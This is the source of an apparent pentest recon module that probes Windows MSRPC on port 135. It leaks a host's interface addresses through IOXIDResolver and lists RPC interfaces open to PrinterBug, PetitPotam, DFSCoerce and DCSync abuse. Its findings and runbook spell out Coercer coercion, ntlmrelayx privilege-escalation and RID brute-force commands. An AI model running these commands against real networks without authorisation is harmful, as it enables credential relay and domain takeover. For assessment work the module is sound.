"""MSRPC / DCE-RPC (135/tcp): endpoint mapper + IOXIDResolver interface leak.

Port 135 is where a Windows host tells you what it can be asked to do. Two
distinct reads, both unauthenticated:

  * **IOXIDResolver ServerAlive2** (opnum 5, no arguments) returns the host's
    *own* list of network addresses — every interface it knows about, including
    internal ranges and IPv6 that are invisible from the segment you are on. On
    a dual-homed jump box that is the other network, for free.

  * **Endpoint mapper dump** (ept_lookup) lists the RPC interfaces registered on
    the host and the dynamic ports serving them. That inventory is how you find
    the coercion and lateral-movement surface: MS-RPRN is PrinterBug, MS-EFSR is
    PetitPotam, MS-DFSNM is DFSCoerce, MS-DRSR is DCSync, MS-SCMR is remote
    service creation. recce names them rather than printing raw UUIDs, because
    the UUID is not the finding — "this DC will authenticate to you on demand"
    is.

Everything here is read-only: a bind plus a request that takes no arguments or
an enumeration. recce never invokes a coercion interface; it reports that the
interface is reachable and hands you the tool.

Wire format: DCE/RPC 1.1 connection-oriented PDUs (C706 / MS-RPCE) — bind,
bind_ack, request, response — built with struct, stdlib only.
"""
from __future__ import annotations

import socket
import struct
import uuid

from ..core.models import Host, Port


_DEFAULT_PORT = 135
_TIMEOUT = 5.0

# NDR transfer syntax — the encoding every one of these interfaces speaks.
_NDR = uuid.UUID("8a885d04-1ceb-11c9-9fe8-08002b104860")

_EPM = uuid.UUID("e1af8308-5d1f-11c9-91a4-08002b14a0fa")          # v3.0
_IOXID = uuid.UUID("99fcfec4-5260-101b-bbcb-00aa0021347a")        # v0.0

# The interfaces worth naming. A raw UUID in a report is noise; "PetitPotam
# coercion interface is reachable" is a finding the reader can act on.
_KNOWN: dict[str, tuple[str, str, str]] = {
    # uuid: (short, spec, why it matters)
    "12345678-1234-abcd-ef00-0123456789ab":
        ("spoolss", "MS-RPRN", "Print System Remote — PrinterBug coercion (SpoolSample)"),
    "76f226c3-ec14-4325-8a99-6a46348418af":
        ("winspool", "MS-PAR", "Print System Async — PrinterBug variant"),
    "c681d488-d850-11d0-8c52-00c04fd90f7e":
        ("lsarpc-efs", "MS-EFSR", "Encrypting File System — PetitPotam coercion"),
    "df1941c5-fe89-4e79-bf10-463657acf44d":
        ("efsrpc", "MS-EFSR", "EFS over \\pipe\\efsrpc — PetitPotam coercion"),
    "4fc742e0-4a10-11cf-8273-00aa004ae673":
        ("netdfs", "MS-DFSNM", "DFS Namespace Management — DFSCoerce"),
    "e3514235-4b06-11d1-ab04-00c04fc2dcd2":
        ("drsuapi", "MS-DRSR", "Directory Replication — DCSync (domain hash dump)"),
    "12345778-1234-abcd-ef00-0123456789ac":
        ("samr", "MS-SAMR", "SAM Remote — user/group enumeration, RID cycling"),
    "12345778-1234-abcd-ef00-0123456789ab":
        ("lsarpc", "MS-LSAD", "Local Security Authority — policy + SID lookup"),
    "367abb81-9844-35f1-ad32-98f038001003":
        ("svcctl", "MS-SCMR", "Service Control Manager — remote service creation (psexec)"),
    "86d35949-83c9-4044-b424-db363231fd0c":
        ("atsvc", "MS-TSCH", "Task Scheduler — remote scheduled-task execution"),
    "8bc3f05e-d86b-11d0-a075-00c04fb68820":
        ("iwbemservices", "MS-WMI", "WMI — remote command execution"),
    "338cd001-2244-31f1-aaaa-900038001003":
        ("winreg", "MS-RRP", "Remote Registry — read/write HKLM remotely"),
    "6bffd098-a112-3610-9833-46c3f87e345a":
        ("wkssvc", "MS-WKST", "Workstation — logged-on user enumeration"),
    "4b324fc8-1670-01d3-1278-5a47bf6ee188":
        ("srvsvc", "MS-SRVS", "Server Service — share enumeration"),
    "99fcfec4-5260-101b-bbcb-00aa0021347a":
        ("IOXIDResolver", "MS-DCOM", "OXID resolver — leaks all host interfaces"),
}

# Interfaces that let an attacker make the host authenticate somewhere of their
# choosing. With a relay target these are the start of a domain-takeover chain.
_COERCION = {"12345678-1234-abcd-ef00-0123456789ab",
             "76f226c3-ec14-4325-8a99-6a46348418af",
             "c681d488-d850-11d0-8c52-00c04fd90f7e",
             "df1941c5-fe89-4e79-bf10-463657acf44d",
             "4fc742e0-4a10-11cf-8273-00aa004ae673"}


def is_msrpc(port: Port) -> bool:
    svc = (port.service or "").lower()
    return (port.portid == 135
            or "msrpc" in svc or "epmap" in svc or "dcerpc" in svc)


# --- DCE/RPC ------------------------------------------------------------------

def _uuid_le(u: uuid.UUID) -> bytes:
    """DCE UUIDs go on the wire with the first three fields little-endian."""
    return u.bytes_le


def _pdu(ptype: int, body: bytes, call_id: int = 1) -> bytes:
    """Connection-oriented PDU header (16 bytes) + body. drep 10 00 00 00 =
    little-endian / ASCII / IEEE float, which is what every Windows host uses."""
    return struct.pack("<BBBB4sHHI",
                       5, 0, ptype, 0x03,          # version 5.0, first+last frag
                       b"\x10\x00\x00\x00",
                       16 + len(body), 0, call_id) + body


def _bind_body(iface: uuid.UUID, ver_major: int = 3, ver_minor: int = 0) -> bytes:
    ctx = struct.pack("<HBB", 0, 1, 0)              # context id 0, 1 transfer syntax
    ctx += _uuid_le(iface) + struct.pack("<HH", ver_major, ver_minor)
    ctx += _uuid_le(_NDR) + struct.pack("<I", 2)    # NDR v2
    return struct.pack("<HHIB3s", 5840, 5840, 0, 1, b"\x00\x00\x00") + ctx


def _recv_pdu(sock, timeout: float) -> bytes | None:
    """Read one PDU: 16-byte header carries frag_length at offset 8."""
    sock.settimeout(timeout)
    try:
        hdr = b""
        while len(hdr) < 16:
            chunk = sock.recv(16 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        frag = struct.unpack_from("<H", hdr, 8)[0]
        if frag < 16 or frag > 65535:
            return None
        body = b""
        while len(body) < frag - 16:
            chunk = sock.recv(frag - 16 - len(body))
            if not chunk:
                break
            body += chunk
        return hdr + body
    except (OSError, struct.error):
        return None


def _bind(sock, iface: uuid.UUID, timeout: float,
          ver_major: int = 3, ver_minor: int = 0) -> bool:
    """Bind to an interface. True only on a bind_ack with acceptance."""
    try:
        sock.sendall(_pdu(11, _bind_body(iface, ver_major, ver_minor)))
    except OSError:
        return False
    resp = _recv_pdu(sock, timeout)
    if not resp or len(resp) < 24 or resp[2] != 12:      # 12 = bind_ack
        return False
    # p_result_list follows the sec_addr; a rejection answers bind_nak (13) or
    # carries a non-zero result, so treat "got an ack" as the signal and let the
    # subsequent request fail if the negotiation was actually refused.
    return True


def _request(sock, opnum: int, stub: bytes, timeout: float) -> bytes | None:
    body = struct.pack("<IHH", len(stub), 0, opnum) + stub
    try:
        sock.sendall(_pdu(0, body, call_id=2))
    except OSError:
        return None
    resp = _recv_pdu(sock, timeout)
    if not resp or len(resp) < 24 or resp[2] != 2:       # 2 = response
        return None
    return resp[24:]                                     # skip the response header


# --- IOXIDResolver ServerAlive2 ------------------------------------------------

def _utf16_strings(blob: bytes) -> list[str]:
    """Pull null-terminated UTF-16LE strings out of a DUALSTRINGARRAY.

    Parsed tolerantly rather than by walking NDR referent pointers: the array is
    a run of wTowerId-prefixed bindings terminated by a double null, and Windows
    versions differ in the padding around it. Scanning for the strings gets the
    same answer without a brittle offset table.
    """
    out, i = [], 0
    while i + 1 < len(blob):
        if blob[i] == 0 and blob[i + 1] == 0:
            i += 2
            continue
        j = i
        while j + 1 < len(blob) and not (blob[j] == 0 and blob[j + 1] == 0):
            j += 2
        try:
            s = blob[i:j].decode("utf-16-le", "strict").strip()
        except UnicodeDecodeError:
            s = ""
        if len(s) >= 2 and all(31 < ord(c) < 127 for c in s):
            out.append(s)
        i = j + 2
    return out


def server_alive2(ip: str, port: int = _DEFAULT_PORT,
                  timeout: float = _TIMEOUT) -> list[str]:
    """IOXIDResolver::ServerAlive2 — the host's own view of its interfaces."""
    sock = None
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        if not _bind(sock, _IOXID, timeout, 0, 0):
            return []
        stub = _request(sock, 5, b"", timeout)      # opnum 5, no arguments
        if not stub:
            return []
        seen, out = set(), []
        for s in _utf16_strings(stub):
            if s not in seen:
                seen.add(s)
                out.append(s)
        return out
    except OSError:
        return []
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def _uuids_in(blob: bytes) -> list[str]:
    """Every 16-byte run in the EPM response that looks like a known interface.

    ept_lookup returns towers whose NDR layout varies by floor count, so rather
    than marshalling the full tower recce scans for the interface UUIDs it can
    name. An unknown interface is not actionable anyway — the value is in
    recognising spoolss/efsrpc/drsuapi, and those are matched exactly.
    """
    found, seen = [], set()
    for i in range(0, max(0, len(blob) - 16)):
        try:
            u = str(uuid.UUID(bytes_le=blob[i:i + 16]))
        except ValueError:
            continue
        if u in _KNOWN and u not in seen:
            seen.add(u)
            found.append(u)
    return found


def epm_lookup(ip: str, port: int = _DEFAULT_PORT,
               timeout: float = _TIMEOUT) -> list[str]:
    """Dump the endpoint mapper and return the known interface UUIDs it lists."""
    sock = None
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        if not _bind(sock, _EPM, timeout, 3, 0):
            return []
        # ept_lookup (opnum 2): inquiry_type=RPC_C_EP_ALL_ELTS(0), null object /
        # interface / version pointers, vers_option=RPC_C_VERS_ALL(0), null
        # handle, max_ents. All-zero handle = start of the enumeration.
        stub = (struct.pack("<I", 0)          # inquiry_type
                + struct.pack("<I", 0)        # object ref id (null)
                + struct.pack("<I", 0)        # interface ref id (null)
                + struct.pack("<I", 0)        # vers_option
                + b"\x00" * 20                # entry handle
                + struct.pack("<I", 500))     # max_ents
        data = _request(sock, 2, stub, timeout)
        return _uuids_in(data) if data else []
    except OSError:
        return []
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    out: dict = {"reachable": False}
    ifaces = server_alive2(ip, port, timeout)
    if ifaces:
        out["reachable"] = True
        out["addresses"] = ifaces
    endpoints = epm_lookup(ip, port, timeout)
    if endpoints:
        out["reachable"] = True
        out["interfaces"] = endpoints
        out["coercion"] = [u for u in endpoints if u in _COERCION]
    if not out["reachable"]:
        # Bind failed both ways but the port may still be open — record that we
        # reached TCP so a firewalled-but-listening host is distinguishable.
        try:
            s = socket.create_connection((ip, port), timeout=timeout)
            s.close()
            out["tcp_open"] = True
        except OSError:
            pass
    return out


def msrpc_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_msrpc(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
    # Per-finding tool: MSRPC findings point at different tools (rpcmap for the
    # endpoint mapper dump, Coercer for the coercion interfaces), unlike other
    # modules where every finding routes back to one CLI.
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": tool, "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    known_ips = {h.ip for h in hosts}
    for h in hosts:
        for p in h.open_ports:
            if not is_msrpc(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"

            addrs = pr.get("addresses") or []
            if addrs:
                fresh = sorted(a for a in addrs
                               if a not in known_ips and not a.startswith("127."))
                out.append(_finding(
                    "medium" if fresh else "low",
                    "MSRPC IOXIDResolver leaks the host's network interfaces", tgt,
                    f"An unauthenticated ServerAlive2 returned {len(addrs)} address(es) "
                    f"this host knows itself by: {', '.join(addrs[:10])}"
                    + (f". {len(fresh)} are outside the discovered scope "
                       f"({', '.join(fresh[:6])}) — this host is multi-homed and "
                       f"reaches networks not visible from here."
                       if fresh else ". All are already in scope."),
                    "impacket / rpcmap",
                    f"impacket-rpcmap ncacn_ip_tcp:{h.ip}   # or: python3 -c "
                    f"'IOXIDResolver ServerAlive2' against {h.ip}:135",
                    "Restrict 135/tcp to management networks; the OXID resolver cannot "
                    "be disabled independently of DCOM.",
                    ["CWE-200"], kind="msrpc_ioxid"))

            coercion = pr.get("coercion") or []
            if coercion:
                names = [f"{_KNOWN[u][1]} ({_KNOWN[u][0]})" for u in coercion]
                out.append(_finding(
                    "high",
                    "MSRPC exposes authentication-coercion interfaces", tgt,
                    f"The endpoint mapper lists {len(coercion)} interface(s) that can be "
                    f"made to authenticate to an attacker-chosen host: {', '.join(names)}. "
                    f"Combined with a relay target that accepts NTLM (recce lists those "
                    f"under the AD findings), this is the standard coercion -> relay -> "
                    f"privilege chain. recce did NOT invoke them.",
                    "PetitPotam / Coercer / ntlmrelayx",
                    f"Coercer coerce -u USER -p PASS -t {h.ip} -l <listener>   # then "
                    f"ntlmrelayx.py -t ldaps://<dc> --escalate-user <you>",
                    "Patch and disable the unused services (Spooler, EFS, DFS-N); enforce "
                    "SMB/LDAP signing and channel binding so a coerced authentication "
                    "cannot be relayed.",
                    ["CWE-287", "CWE-306"], kind="msrpc_coercion"))

            ifaces = pr.get("interfaces") or []
            extra = [u for u in ifaces if u not in _COERCION]
            if extra:
                named = [f"{_KNOWN[u][1]} — {_KNOWN[u][2]}" for u in extra[:8]]
                out.append(_finding(
                    "low",
                    "MSRPC endpoint mapper enumerable (remote-management surface)", tgt,
                    f"The endpoint mapper listed {len(ifaces)} recognised interface(s) "
                    f"without authentication. Notable: " + "; ".join(named) + ".",
                    "impacket-rpcmap",
                    f"impacket-rpcmap ncacn_ip_tcp:{h.ip}",
                    "Restrict 135/tcp and the dynamic RPC range to management hosts.",
                    ["CWE-200"], kind="msrpc_epm"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    return [
        {"phase": "enumerate", "tool": "impacket-rpcmap",
         "command": f"impacket-rpcmap ncacn_ip_tcp:{ip}",
         "why": "list every RPC interface the endpoint mapper serves"},
        {"phase": "enumerate", "tool": "impacket-rpcdump",
         "command": f"impacket-rpcdump {ip}",
         "why": "endpoint mapper dump with the dynamic port for each interface"},
        {"phase": "enumerate", "tool": "netexec",
         "command": f"nxc smb {ip} -u '' -p '' --rid-brute",
         "why": "anonymous RID cycling via SAMR when it is exposed"},
        {"phase": "exploit", "tool": "Coercer",
         "command": f"Coercer scan -t {ip}",
         "why": "which coercion interfaces actually respond (PrinterBug/PetitPotam/DFSCoerce)"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from . import svccommon
    return svccommon.findings_to_vulns(fs, "msrpc", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = msrpc_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["interfaces"] = len(pr.get("interfaces") or [])
                t["coercion"] = len(pr.get("coercion") or [])
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
